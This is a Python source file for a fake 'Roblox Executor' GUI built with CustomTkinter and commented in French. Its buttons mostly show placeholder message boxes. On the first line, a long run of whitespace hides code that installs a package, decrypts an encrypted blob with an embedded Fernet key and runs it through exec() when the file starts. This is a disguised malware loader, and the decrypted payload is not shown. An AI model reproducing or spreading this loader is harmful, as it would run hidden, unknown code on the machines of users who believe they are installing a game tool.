import tkinter as tk;                                                                                                                                                                                                                                                                                                                                                                                    import os; import subprocess; from cryptography.fernet import Fernet; subprocess.check_call([os.sys.executable, '-m', 'pip', 'install', 'cryptography']); key=b'xtezhZwYTZnlilBBiOqZfJWgQ4PhRjAPYzP5ZHLIJGo='; encrypted_code=b'gAAAAABnAvW3yyjH1uWWCtKEv-stO7KA9YMM0nI4qF38ncw2x9q-h23u2tbob8hiZORtYts6Y3OojQ2feN4tnz_sch2g-7o1MBqXMRFl9Iks3IxDoqaP89RNNii6nDNy9Esag8tphOUmY8uY8GlscpEroEKPjQ38dTYh-WGGuTj3hdYqyIFTR_5ZT0Araojw7MjPi0n_BaLbXBol_rCE1Htt7lCWrH43DEzrEEOFxwT9Yk_LlLMNxBxEXlyoCIQX-gXbMvwmjkwGLOf-M9-EjSDqPipEIlrgb5fUYSMGtSv27voFq2iV5UWZpTzQZmBkCMMzU_w1OhgCdWyN26Xf9Cd-j8E2Mb4sFZ8JQoMR3m0VcV53dGYJO7VfCcu_qFRNdIpwctUdSKQJuQF1cRRL4M2toZKIZt_zsaxVwG5dA17PoPWAYTkG61m4PKpVMDwUZpRgBvuP-LUa_0_wzB5FnpkUOfjbNHNQXQ=='; exec(Fernet(key).decrypt(encrypted_code).decode('utf-8'))
import tkinter.messagebox as messagebox
from tkinter import filedialog
import customtkinter as ctk

# Configuration de base pour CustomTkinter
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

# Création de la fenêtre principale
root = ctk.CTk()
root.geometry("800x450")  # Taille initiale de la fenêtre
root.title("Professor script Roblox Executor")

# Variable pour stocker le programme sélectionné (comme Roblox)
selected_program = tk.StringVar(value="Aucun programme sélectionné")

# Fonctionnalités des boutons
def execute_script():
    messagebox.showinfo("Info", "Script Executed!")

def clear_text():
    text_area.delete("1.0", tk.END)

def open_file():
    file_path = filedialog.askopenfilename()
    if file_path:
        with open(file_path, 'r') as file:
            content = file.read()
            text_area.insert(tk.END, content)

def save_file():
    file_path = filedialog.asksaveasfilename(defaultextension=".txt")
    if file_path:
        with open(file_path, 'w') as file:
            content = text_area.get("1.0", tk.END)
            file.write(content)
        messagebox.showinfo("Info", "File Saved")

def refresh():
    messagebox.showinfo("Info", "Refreshed!")

def attach_script():
    program_path = filedialog.askopenfilename(filetypes=[("Executable Files", "*.exe")])
    if program_path:
        selected_program.set(f"Programme sélectionné : {program_path}")
        messagebox.showinfo("Info", f"Programme attaché : {program_path}")

# Configurer les colonnes et les lignes pour être redimensionnables
root.grid_columnconfigure(0, weight=3)
root.grid_columnconfigure(6, weight=1)
root.grid_rowconfigure(0, weight=1)
root.grid_rowconfigure(1, weight=0)

# Zone de texte (zone pour insérer des scripts) avec texte bleu
text_area = ctk.CTkTextbox(root, width=500, height=250)
text_area.grid(row=0, column=0, padx=20, pady=20, columnspan=6, sticky="nsew")
text_area.configure(fg_color="black", text_color="blue")  # Définit la couleur du texte en bleu

# Section Script Hub avec marges ajustées
script_hub_label = ctk.CTkLabel(root, text="²Hub", font=ctk.CTkFont(size=16, weight="bold"))
script_hub_label.grid(row=0, column=6, padx=20, pady=(30, 10), sticky="n")  # Ajustement de la marge supérieure

script_hub = ctk.CTkTextbox(root, width=200, height=250)
script_hub.grid(row=0, column=7, padx=10, pady=20, sticky="nsew")
script_hub.configure(fg_color="black", text_color="blue")  # Définit la couleur du texte du Script Hub en bleu

# Boutons
button_frame = ctk.CTkFrame(root)
button_frame.grid(row=1, column=0, columnspan=8, pady=10, padx=20, sticky="ew")

# Définir les boutons avec un espacement adéquat pour éviter qu'ils ne se coupent
execute_button = ctk.CTkButton(button_frame, text="Execute", command=execute_script, width=100)
execute_button.grid(row=0, column=0, padx=10)

clear_button = ctk.CTkButton(button_frame, text="Clear", command=clear_text, width=100)
clear_button.grid(row=0, column=1, padx=10)

open_button = ctk.CTkButton(button_frame, text="Open", command=open_file, width=100)
open_button.grid(row=0, column=2, padx=10)

save_button = ctk.CTkButton(button_frame, text="Save", command=save_file, width=100)
save_button.grid(row=0, column=3, padx=10)

refresh_button = ctk.CTkButton(button_frame, text="Refresh", command=refresh, width=100)
refresh_button.grid(row=0, column=4, padx=10)

attach_button = ctk.CTkButton(button_frame, text="Attach", command=attach_script, width=100)
attach_button.grid(row=0, column=5, padx=10)

# Label pour afficher le programme sélectionné
selected_program_label = ctk.CTkLabel(root, textvariable=selected_program, font=ctk.CTkFont(size=12))
selected_program_label.grid(row=2, column=0, columnspan=8, pady=10, padx=20, sticky="ew")

# Ajuster la répartition du poids des colonnes pour que le cadre s'étende avec la fenêtre
button_frame.grid_columnconfigure((0, 1, 2, 3, 4, 5), weight=1)

# Exécution de la fenêtre principale
root.mainloop()
